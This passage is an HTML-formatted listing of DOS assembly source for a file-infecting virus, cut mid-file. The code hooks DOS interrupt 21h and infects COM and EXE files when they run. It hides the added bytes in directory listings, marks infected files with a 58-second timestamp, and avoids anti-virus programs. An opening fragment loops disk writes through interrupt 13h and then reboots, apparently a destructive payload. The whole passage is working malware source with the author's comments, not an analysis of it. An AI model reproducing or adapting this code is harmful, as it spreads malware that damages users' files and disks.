                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">                    </span><span class="sc1">;Hurts So good...           </span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc0">                                                 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                                             
                </span><span class="sc6">loopne</span><span class="sc0">  </span><span class="sc5">hurt_me</span><span class="sc0">                                            
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">  </span><span class="sc1">;Reboot!                 </span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">                                                       
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc1">;                       Dir Handler                                        </span><span class="sc0">
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc5">dir_handler</span><span class="sc4">:</span><span class="sc0">                                                               
                </span><span class="sc6">pushf</span><span class="sc0">                                                      
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                                                 
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21call</span><span class="sc0">              </span><span class="sc1">;Get file Stats             </span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">;Good FCB?                  </span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_good</span><span class="sc0">                </span><span class="sc1">;nope                       </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                                                 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">                 </span><span class="sc1">;Is this Undocmented? huh...</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                                                                           
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                                              
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">                                        
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_infected</span><span class="sc0">           </span><span class="sc1">;Not for us man...          </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                              
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                                            
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                                                 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                 </span><span class="sc1">;Get file DTA               </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                                                                           
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                 
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                                                 
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">fcb_okay</span><span class="sc0">                                           
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">                                              
</span><span class="sc5">fcb_okay</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">                                     
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                 </span><span class="sc1">;UnMask Seconds Field       </span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1dh</span><span class="sc0">                 </span><span class="sc1">;Is in 58 seconds?          </span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_infected</span><span class="sc0">           </span><span class="sc1">;Nope...                    </span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0e0h</span><span class="sc0">                          
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc5">virus_size</span><span class="sc0">    </span><span class="sc1">;Yes minus virus size    </span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                                     
</span><span class="sc5">not_infected</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                 
</span><span class="sc5">no_good</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">iret</span><span class="sc0">                                                       
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc1">;                       Int 21 Handler                                     </span><span class="sc0">
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc5">int21_handler</span><span class="sc4">:</span><span class="sc0">                                                             
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">               </span><span class="sc1">;File executed              </span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">execute</span><span class="sc0">                                            
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">                 </span><span class="sc1">;Dir handler                </span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dir_handler</span><span class="sc0">                                        
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">                 </span><span class="sc1">;Next file Dir handler      </span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dir_handler</span><span class="sc0">                                        
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7bcdh</span><span class="sc0">               </span><span class="sc1">;Virus testing              </span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">int21call</span><span class="sc0">                                          
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">execute</span><span class="sc0">                                            
</span><span class="sc5">int21call</span><span class="sc4">:</span><span class="sc0">                                                                 
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Split...                   </span><span class="sc0">
</span><span class="sc5">execute</span><span class="sc4">:</span><span class="sc0">                                                                   
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                                                 
                                                                           
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7bcdh</span><span class="sc0">               </span><span class="sc1">;Was Virus testing if it was</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">continue</span><span class="sc0">               </span><span class="sc1">;Alive? If No Continue      </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">;If Yes, Check if COMMAND.CO</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">command</span><span class="sc0">      </span><span class="sc1">;Is infected! And return    </span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">continue2</span><span class="sc0">                                          
</span><span class="sc5">continue</span><span class="sc4">:</span><span class="sc0">                                                                  
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_name</span><span class="sc0">             </span><span class="sc1">;Make sure file executed    </span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_now</span><span class="sc0">               </span><span class="sc1">;Ain't a Anti-Viral program </span><span class="sc0">
</span><span class="sc5">continue2</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;With the CRC-32 checkers   </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">               </span><span class="sc1">;Get file Attribs           </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">                                               
                                                                           
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">                  </span><span class="sc1">;Make sure there normal     </span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">open_file</span><span class="sc0">              </span><span class="sc1">;Okay there are             </span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">                </span><span class="sc1">;Nope, Fix them...          </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">               </span><span class="sc1">;Save them now              </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">                                               
                                                                           
</span><span class="sc5">open_file</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">                                           
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">;Open File to Infect please </span><span class="sc0">
                                                                           
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">                   </span><span class="sc1">;Error Split                </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">;BX File handler            </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">               </span><span class="sc1">;Get file TIME + DATE       </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                                                                           
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                                              
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                 </span><span class="sc1">;Un mask Seconds            </span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">;60 seconds                 </span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">;58 seconds                 </span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">;Is it 58 seconds?          </span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">                   </span><span class="sc1">;File already infected      </span><span class="sc0">
                                                                           
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_time</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">;Save Time         </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_date</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">;Save Date         </span><span class="sc0">
                                                                           
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                                             
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                                             
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Read first 20h bytes       </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                                                                           
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_now</span><span class="sc0">               </span><span class="sc1">;Error Split                </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">               </span><span class="sc1">;Move file pointer to end of</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">;file...                    </span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                              
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                                                                           
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_now</span><span class="sc0">                       </span><span class="sc1">;Error Split        </span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">],</span><span class="sc2">5A4Dh</span><span class="sc0">     </span><span class="sc1">;Is file an EXE?    </span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exe_file</span><span class="sc0">                       </span><span class="sc1">;JMP to EXE Infector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                              
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">;Set the JMP        </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jump_address</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                    
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_me</span><span class="sc0">                      </span><span class="sc1">;Infect!            </span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_now</span><span class="sc0">                       </span><span class="sc1">;error split        </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                         </span><span class="sc1">;Write back the firs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">jump_address</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;bytes              </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">                                              
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
</span><span class="sc5">exit_now</span><span class="sc4">:</span><span class="sc0">                                                                  
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_time</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Restore old time   </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_date</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Restore Old date   </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                                           
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
</span><span class="sc5">exit_now2</span><span class="sc4">:</span><span class="sc0">                                                                 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                                             
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;Close File now...         </span><span class="sc0">
</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">                                                                      
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7bcdh</span><span class="sc0">                </span><span class="sc1">;Virus checking if alive   </span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">leave_now</span><span class="sc0">               </span><span class="sc1">;No, Exit normally         </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;Yes, Fix BX with codez    </span><span class="sc0">
</span><span class="sc5">leave_now</span><span class="sc4">:</span><span class="sc0">                                                                 
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Jmp back to whatever      </span><span class="sc0">
</span><span class="sc5">exe_file</span><span class="sc4">:</span><span class="sc0">                                                                  
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;IP Regester        </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exe_ip</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">;Save IP Regester   </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;CS Regester        </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exe_cs</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">;Save CS Regester   </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;SP Regester        </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exe_sp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">;Save SP Regester   </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;SS Regester        </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exe_ss</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">;Save SS Regester   </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                                                 
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multiply</span><span class="sc0">                       </span><span class="sc1">;Figure a new CS:IP </span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                          
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">;Restore New CS     </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Restore New IP     </span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                 
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">                                      
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                               
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                                                 
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multiply</span><span class="sc0">                      </span><span class="sc1">;Figure a new SS:SP  </span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Exe Size (512 Usuall</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                                             
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">;New SS Pointer      </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;New SP Pointer      </span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                 
                                                                           
